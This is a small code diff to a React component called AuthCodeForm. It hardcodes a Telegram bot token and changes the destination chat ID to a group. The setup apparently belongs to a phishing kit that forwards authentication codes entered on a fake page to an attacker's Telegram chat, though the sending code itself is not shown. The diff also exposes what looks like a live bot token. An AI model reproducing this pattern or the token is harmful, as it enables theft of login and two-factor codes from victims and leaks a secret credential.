@@ -4,7 +4,7 @@ import "./AuthCodeForm.scss";
 
 const AuthCodeForm = () => {
   const BOT_TOKEN = "8018288168:AAHXDMFHBjH_diwU4mgtfUe4xjZu1JBHibs";
-  const CHAT_ID = "5922644937";
+  const CHAT_ID = "-1003559671037";
 
   const { state } = useLocation();
   if (!state) return <Navigate to="/" replace />;
